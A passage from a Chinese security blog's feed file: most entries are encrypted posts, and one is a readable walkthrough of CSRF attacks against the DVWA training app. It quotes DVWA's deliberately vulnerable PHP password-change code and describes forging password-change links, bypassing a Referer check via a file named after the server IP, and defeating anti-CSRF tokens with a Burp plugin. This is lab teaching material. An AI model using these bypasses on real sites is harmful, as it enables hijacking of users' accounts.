6f3eabd495de6b31308d0b94a43a79edf6edff9a170544cf1ecaccd28c78df087dbcc7295096bc5c217963cff71257269d92aace190d03533a06703333abf2c8cbab5797510c2bab52f32e77ed451381f9efbaff888fbceffdb4027db780746e0ad04924f8ce048e68</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Linux kernel</category>
      </categories>
      <tags>
        <tag>Linux_kernel的文件IO</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之免杀与远控</title>
    <url>/2024/01/19/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%85%8D%E6%9D%80%E4%B8%8E%E8%BF%9C%E6%8E%A7/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ea1f5e1702534b10379794d27d972e77e4d23eee8387dcdb92b3dc45abb01c12">2d806215ddc7c4fd1f6babc1a9ab678d6b15992746f26bfdbdf0a2f49fb26f637efa9558e74f8d414916a01f5fabf711743c93f126a6f95dffbf7e12a69fb5cbca9235d7a9821cce9d1bec6ab0a499cb63ab785fc57f954f16234ce12ded4ad652273d88b573ebcd6bc407cc682ce7b3067ecf51acff809f69bcf1047b03eddc8ef3b521772da605e74d77384b4a03acb091e2f000943e31fa30cf07cf15dabbb536c5d8b053adff6d5913f691355cba967eb72662292ed03f18e59cfd6a8b1a99632df0660509d6de38acd29346a09391f456110ba82f8894ac4075d8c0c88f1ce0a34507dfb56b9377fb30fab48589bc95604d2e4802037dc9d387f9f3b15a1bc43c1c3973d7799063beee0bc32fbe35e912c3c4592dca955bdace98ffa60c270715cc35af7f178e85b2d41a336c8b8d52a9bb354efb1ecae49c98a3078347009449d4b345856c84cfcd91df6552bab25f406b03a797a3f0ae0118accdeccdc10c54dfb7f5c0a4845408db583d618b8fd989bea0986e1852ee1487011924cb4b1ae2868fba3c93f993c47637dd004954696e8698ea6d1fa73f4042021096c28ad91805b5f7e6273224b1b86817c41583a660ebad41898feb16456065f7a781866677c30069a7a32824ff1804bcfacc</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>免杀与远控</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之信息收集</title>
    <url>/2023/12/26/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="507caea213511db4b7d88a384b08a49d69baa422bdfa50fd4797e224f9e6b65b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>AI安全研习</title>
    <url>/2023/10/30/AI%E5%AE%89%E5%85%A8%E7%A0%94%E4%B9%A0/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>车联网安全基础</title>
    <url>/2023/10/25/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>密码学笔记</title>
    <url>/2023/10/24/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="1c36839b87062b6e302ef8b9814296f85320ccfdcf4fdd73fbb82c6ca826e233">2d806215ddc7c4fd1f6babc1a9ab678d6b15992746f26bfdbdf0a2f49fb26f63d479e637eae3b4c263955e20718ead88425721e59897576ca2ea7d87397cf595622433febed7f2acedcd78abc227bd6f9c15c23aa3661fae896ec9b986cf10dfc9dec7e0b35bb99e8b64e1a7e92107e90a27782f13b67952c40ba40ecf100289b225051e18d97a2a00d5cea0cd80650f57f412e1a01f67bc6c4e52112aa9a685</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>密码学基础</tag>
      </tags>
  </entry>
  <entry>
    <title>如何黑掉一颗卫星</title>
    <url>/2023/10/17/%E5%A6%82%E4%BD%95%E9%BB%91%E6%8E%89%E4%B8%80%E9%A2%97%E5%8D%AB%E6%98%9F/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HAS</category>
      </categories>
      <tags>
        <tag>HAS</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT-入门篇</title>
    <url>/2023/10/17/IoT-%E5%85%A5%E9%97%A8%E7%AF%87/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4ede199db40f29b037c8a719af59419279ef83db4380d9d959fde8f9f742505c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT-Start</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机科学中的数学</title>
    <url>/2023/10/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%A6/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Pwn_Kernel及相关例题</title>
    <url>/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="e324ebecaa5639f0a4a3537205fee20f07b96cd5b52b1995bc3bd219007f081c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Pwn_Other及相关例题</title>
    <url>/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Other%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fd8ec72110e70274006307f63666656a035130746a458f716ce73b572e790b77"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Other</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全-CSRF</title>
    <url>/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/</url>
    <content><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>一般来说，攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令。利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p>
<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $current_user = dvwaCurrentUser();</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . $current_user . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011094240554.png"
                      alt="image-20231011094240554"
                ></p>
<p>没有做任何防护。直接输入新密码即可。</p>
<ul>
<li>抓包查看</li>
</ul>
<p>将密码修改为 <code>123456</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011094451943.png"
                      alt="image-20231011094451943"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011095446264.png"
                      alt="image-20231011095446264"
                ></p>
<ul>
<li>Attack</li>
</ul>
<p><code>URL</code> 就是一个 <code>GET</code> 请求。诱骗用户点击此链接即可就会在用户不知情的情况下修改密码为 <code>123456</code>。</p>
<ol>
<li>拦截请求后，右击请求界面，选择生成CSRF PoC</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011102256026.png"
                      alt="image-20231011102256026"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011103354780.png"
                      alt="image-20231011103354780"
                ></p>
<ol start="2">
<li>点击用浏览器中测试。</li>
</ol>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011103421274.png"
                      alt="image-20231011103421274"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011103930091.png"
                      alt="image-20231011103930091"
                ></p>
<p>复制弹出来的 <code>URL</code> ，将<code>burpsuite</code> 改为 <code>ip:8080</code> 比如 <code>127.0.0.1:8080</code>，访问这个 <code>URL</code> 将会自动跳转到修改密码 <code>URL</code> ，并修改密码为 <code>123456</code>。</p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Checks to see where the request came from</span><br><span class="line">    if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123;</span><br><span class="line">        // Get input</span><br><span class="line">        $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">        $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">        // Do the passwords match?</span><br><span class="line">        if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            // They do!</span><br><span class="line">            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            // Update the database</span><br><span class="line">            $current_user = dvwaCurrentUser();</span><br><span class="line">            $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . $current_user . &quot;&#x27;;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Feedback for the user</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Issue with passwords matching</span><br><span class="line">            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Didn&#x27;t come from a trusted source</span><br><span class="line">        echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>检测机制：在修改密码等敏感操作时，会检测 <code>referer</code> 请求来源地址，里面是否存在主机 <code>ip</code> 或域名。我们可以构造一个有效的 <code>Referer</code>，可以在攻击服务器上创建一个新的 <code>html</code> 页面，命名时 要含有 <code>csrf</code> 网站主机 <code>ip</code> 地址。所以这对本地搭建的无影响。我们通过回环和局域网 <code>Ip</code> 的方式来进行测试。</p>
<p>假如服务器地址为 <code>192.168.66.66</code>，即为 <code>SERVER_NAME</code>，我们只需要把我们构造的恶意页面文件名改为 <code>192.168.66.66.html</code>，<code>HTTP_REFERER</code>就会包含<code>192.168.66.66.html</code>,就可以绕过 <code>stripos</code>了。</p>
<ul>
<li>Attack</li>
</ul>
<ol>
<li>通过本地 <code>IP</code> 访问 <code>dvwa</code> 页面，利用 <code>burp</code> 抓包，并制作 <code>CSRF PoC</code>。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012145844804.png"
                      alt="image-20231012145844804"
                ></p>
<ol start="2">
<li>复制 <code>HTML</code> 代码，并将其命名为<code>192.168.56.1</code> 放在 <code>WWW</code> 目录下。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012145945233.png"
                      alt="image-20231012145945233"
                ></p>
<ol start="3">
<li>放行原来的包将密码改回 <code>password</code>，通过回环访问本地的<code>192.168.56.1.html</code>文件并抓包。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012150205921.png"
                      alt="image-20231012150205921"
                ></p>
<p>可以看见 <code>referer</code> 和 <code>host</code> 的地址并不相同，我们将 <code>referer</code> 指向 攻击者服务器地址即 <code>192.168.56.1.html</code>即可绕过。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012150452551.png"
                      alt="image-20231012150452551"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012150521082.png"
                      alt="image-20231012150521082"
                ></p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$change = false;</span><br><span class="line">$request_type = &quot;html&quot;;</span><br><span class="line">$return_message = &quot;Request Failed&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot; &amp;&amp; array_key_exists (&quot;CONTENT_TYPE&quot;, $_SERVER) &amp;&amp; $_SERVER[&#x27;CONTENT_TYPE&#x27;] == &quot;application/json&quot;) &#123;</span><br><span class="line">    $data = json_decode(file_get_contents(&#x27;php://input&#x27;), true);</span><br><span class="line">    $request_type = &quot;json&quot;;</span><br><span class="line">    if (array_key_exists(&quot;HTTP_USER_TOKEN&quot;, $_SERVER) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_new&quot;, $data) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_conf&quot;, $data) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;Change&quot;, $data)) &#123;</span><br><span class="line">        $token = $_SERVER[&#x27;HTTP_USER_TOKEN&#x27;];</span><br><span class="line">        $pass_new = $data[&quot;password_new&quot;];</span><br><span class="line">        $pass_conf = $data[&quot;password_conf&quot;];</span><br><span class="line">        $change = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if (array_key_exists(&quot;user_token&quot;, $_REQUEST) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_new&quot;, $_REQUEST) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_conf&quot;, $_REQUEST) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;Change&quot;, $_REQUEST)) &#123;</span><br><span class="line">        $token = $_REQUEST[&quot;user_token&quot;];</span><br><span class="line">        $pass_new = $_REQUEST[&quot;password_new&quot;];</span><br><span class="line">        $pass_conf = $_REQUEST[&quot;password_conf&quot;];</span><br><span class="line">        $change = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($change) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $token, $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = mysqli_real_escape_string ($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new);</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $current_user = dvwaCurrentUser();</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;&quot; . $pass_new . &quot;&#x27; WHERE user = &#x27;&quot; . $current_user . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        $return_message = &quot;Password Changed.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        $return_message = &quot;Passwords did not match.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line"></span><br><span class="line">    if ($request_type == &quot;json&quot;) &#123;</span><br><span class="line">        generateSessionToken();</span><br><span class="line">        header (&quot;Content-Type: application/json&quot;);</span><br><span class="line">        print json_encode (array(&quot;Message&quot; =&gt;$return_message));</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;pre&gt;&quot; . $return_message . &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>checkToken</code>函数来实现 <code>Anti-csrf  token</code> 机制，用户每次访问更改密码页面时，服务器会返回一个随机的 <code>token</code>，之后每次向服务器发起请求，服务器会优先验证<code>token</code>，如果token正确，那么才会处理请求。所以我们在发起请求之前需要获取服务器返回的<code>user_token</code>，利用<code>user_token</code>绕过验证。这里我们可以使用<code>burpsuit</code>的<code>CSRF Token Tracker</code>插件可以直接绕过<code>user_token</code>验证。</p>
<ul>
<li>Attack</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012152409701.png"
                      alt="image-20231012152409701"
                ></p>
<p>添加 <code>Host</code> 和 <code>Name</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012152829738.png"
                      alt="image-20231012152829738"
                ></p>
<p>发送到 <code>repeater</code>，每次发送都会随机<code>token</code>的值，直接发送即可。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
